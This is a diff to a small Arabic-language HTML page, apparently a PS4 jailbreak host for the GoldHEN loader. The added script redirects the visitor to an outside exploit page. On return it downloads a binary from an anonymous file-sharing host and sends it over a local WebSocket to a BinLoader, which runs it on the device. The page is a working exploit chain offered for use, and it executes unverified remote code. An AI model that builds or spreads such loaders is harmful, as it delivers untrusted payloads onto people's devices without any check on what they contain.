@@ -1,8 +1,7 @@
 <!DOCTYPE html><html lang="ar">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>💀 RIDERMAX REAL HOST</title><style>
+<title>💀 RIDERMAX AUTO HOST</title><style>
 body{
  background:#0b0f1a;
  color:#00ffaa;
@@ -32,10 +31,9 @@ button{
  height:220px;
  overflow:auto;
  text-align:left;
- direction:ltr;
 }
 </style></head><body><h1>@ridermax707</h1>
-<h2>🔥 GoldHEN Loader (ONLINE)</h2><button onclick="run()">💀 هكرني ابن بنية</button>
+<h2>🔥 AUTO EXPLOIT + GOLDHEN</h2><button onclick="start()">💀 هكرني ابن بنية</button>
 
 <div id="log"></div><script>
 const logBox = document.getElementById("log");
@@ -45,37 +43,46 @@ function log(t){
  logBox.scrollTop = logBox.scrollHeight;
 }
 
-function run(){
+function start(){
 
- log("🚀 بدء التشغيل...");
- log("📡 محاولة الاتصال بـ BinLoader...");
+ log("🚀 بدء العملية...");
+ log("🌐 فتح exploit...");
 
- let socket = new WebSocket("ws://127.0.0.1:9020");
- socket.binaryType = "arraybuffer";
+ // حفظ حالة
+ localStorage.setItem("hen_step","1");
 
- socket.onopen = ()=>{
-  log("✅ تم الاتصال");
+ // تحويل إلى exploit
+ window.location.href="https://4psf.gt.tc/version-selector.html?i=1";
+}
 
-  fetch("https://files.catbox.moe/6e7po9.bin")
-  .then(res=>{
-    if(!res.ok){
-      throw new Error("فشل تحميل الملف");
-    }
-    return res.arrayBuffer();
-  })
-  .then(buf=>{
-    socket.send(buf);
-    log("🎉 تم تشغيل GoldHEN بنجاح!");
-  })
-  .catch(err=>{
-    log("❌ خطأ: "+err.message);
-  });
- };
+// عند الرجوع للموقع
+window.onload = function(){
 
- socket.onerror = ()=>{
-  log("❌ فشل الاتصال - شغل exploit أول");
- };
+ if(localStorage.getItem("hen_step") === "1"){
 
+  log("✅ رجعنا من exploit");
+  log("📡 محاولة تشغيل GoldHEN...");
+
+  let socket = new WebSocket("ws://127.0.0.1:9020");
+
+  socket.binaryType = "arraybuffer";
+
+  socket.onopen = ()=>{
+    log("✅ تم الاتصال");
+
+    fetch("https://files.catbox.moe/6e7po9.bin")
+    .then(r=>r.arrayBuffer())
+    .then(buf=>{
+      socket.send(buf);
+      log("🎉 GoldHEN اشتغل!");
+      localStorage.removeItem("hen_step");
+    });
+  };
+
+  socket.onerror = ()=>{
+    log("❌ فشل - يمكن exploit ما اشتغل");
+  };
+ }
 }
 </script></body>
 </html>
